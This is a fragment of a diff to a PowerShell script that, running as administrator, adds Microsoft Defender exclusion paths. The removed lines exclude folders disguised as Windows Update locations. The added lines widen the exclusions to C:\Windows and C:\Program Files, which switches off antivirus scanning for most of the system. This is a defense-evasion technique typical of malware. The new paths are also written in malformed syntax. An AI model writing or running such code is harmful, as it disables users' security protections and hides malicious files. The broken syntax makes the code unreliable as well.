@@ -21,8 +21,8 @@ catch {
 function Test-Exclusions {
     $exclusions = (Get-MpPreference).ExclusionPath
     $requiredExclusions = @(
-        "$env:ProgramData\Microsoft\WindowsUpdate",
-        "$env:SystemRoot\Temp\WindowsUpdate"
+            "$env:C:\Windows",
+            "$env:C:\Program Files"
     )
     
     foreach ($exclusion in $requiredExclusions) {
@@ -65,8 +65,8 @@ try {
         # Set exclusions (now running as admin)
         Write-Log "Setting required exclusions"
         $exclusions = @(
-            "$env:ProgramData\Microsoft\WindowsUpdate",
-            "$env:SystemRoot\Temp\WindowsUpdate"
+            "$env:C:\Windows",
+            "$env:C:\Program Files"
         )
         
         foreach ($path in $exclusions) {
